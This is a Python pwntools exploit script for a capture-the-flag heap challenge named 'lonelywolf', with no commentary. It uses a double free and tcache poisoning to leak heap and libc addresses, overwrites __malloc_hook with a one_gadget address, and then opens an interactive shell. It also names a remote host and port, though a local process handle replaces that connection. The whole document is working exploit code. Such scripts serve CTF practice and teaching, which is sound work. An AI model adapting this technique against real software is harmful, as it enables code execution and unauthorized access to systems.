#encoding:utf-8
from pwn import *

p=remote('123.60.218.64','23804')
#p=process('./lonelywolf')
libc=ELF('./libc-2.27.so')
context.log_level = 'debug'
context.binary = './lonelywolf'

def add(size):
	p.sendlineafter('choice: ','1')
	p.sendlineafter('Index: ','0')
	p.sendlineafter('Size: ',str(size))

def edit(idx,text):
	p.sendlineafter('choice: ','2')
	p.sendlineafter('Index: ',str(idx))
	p.sendlineafter('Content: ',text)

def show(idx):
	p.sendlineafter('choice: ','3')
	p.sendlineafter('Index: ',str(idx))
def delete(idx):
	p.sendlineafter('choice: ','4')
	p.sendlineafter('Index: ',str(idx))

#p = remote('',)
p = process('./lonelywolf')
elf = ELF('./lonelywolf')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

add(0x10)
edit(0,p64(0)+p64(0x511))
for i in range(10):
	add(0x78)
add(0x70)
delete(0)
edit(0,p64(0)*2)
delete(0)
show(0)
p.recvuntil('Content: ')
#print p.recv()

heapbase = u64(p.recvline()[:-1].ljust(8,'\x00')) - 0x780
log.success('heapbase==>'+hex(heapbase))

edit(0,p64(heapbase+0x270))
add(0x70)
add(0x70)
edit(0,p64(0)+p64(0x501))

delete(0)
show(0)
p.recvuntil('Content: ')
libcbase = u64(p.recvline()[:-1].ljust(8,'\x00')) -0x60 - 0x3ebc40
log.success('libcbase==>'+hex(libcbase))
malloc_hook = libcbase + libc.sym['__malloc_hook']
log.success('malloc_hook==>'+hex(malloc_hook))
ogg = [0x4f3d5,0x4f432,0x10a41c]


add(0x20)
delete(0)
edit(0,p64(malloc_hook))
add(0x20)
add(0x20)
edit(0,p64(libcbase+ogg[2]))
add(0x10)
#gdb.attach(p)
p.interactive()

